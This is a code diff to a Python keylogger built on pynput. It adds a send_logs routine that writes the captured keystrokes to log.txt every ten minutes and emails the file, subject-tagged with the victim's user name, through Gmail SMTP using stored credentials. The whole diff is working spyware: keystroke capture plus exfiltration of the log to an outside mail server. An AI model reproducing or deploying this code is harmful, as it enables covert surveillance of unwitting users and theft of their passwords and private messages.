@@ -5,11 +5,18 @@ Created on Fri Apr  3 21:00:21 2020
 @author: vieth
 """
 
-import pynput
 import requests
 import socket
 import os
 import time
+
+
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import config
 
 from pynput.keyboard import Key, Listener
 
@@ -67,6 +74,56 @@ def write_file(keys):
 def on_release(key):
     if key == Key.esc:
         return False
+
+def send_logs():
+    count = 0
+    
+    fromAddr = config.fromAddr
+    fromPswd = config.fromPswd
+    toAddr = fromAddr
+    
+    MIN = 10
+    SECONDS = 60
+    time.sleep(MIN * SECONDS) # every 10 mins write file/send log
+    while True:
+        if len(keys) > 1:
+            try:
+                write_file(count)
+                subject = f'[{user}] ~ {count}'
+                
+                msg = MIMEMultipart()
+                msg['From'] = fromAddr
+                msg['To'] = toAddr
+                msg['Subject'] = subject
+                body = 'testing'
+                
+                #in same directory as script
+                filename = "log.txt" 
+                
+                msg.attach(MIMEText(body, "plain"))
+                with open(filename, "rb") as attachment:
+                    part = MIMEBase("application", "octet-stream")
+                    part.set_payload(attachment.read())
+                    
+                encoders.encode_base64(part)
+                part.add_header('content-disposition','attachment;filename=' + str(filename))
+                msg.attach(part)
+                text = msg.as_string()
+                
+                s = smtplib.SMTP('smtp.gmail.com', 587)
+                s.ehlo()
+                s.starttls()
+                print('starttls')
+                
+                s.ehlo()
+                s.login(fromAddr,fromPswd)
+                s.sendmail(fromAddr,toAddr,text)
+                print('sent mail')
+                
+                attachment.close()
+                s.close()
+                
+                count += 1
 
 with Listener(on_press = on_press, on_release = on_release) as listener:
     listener.join()
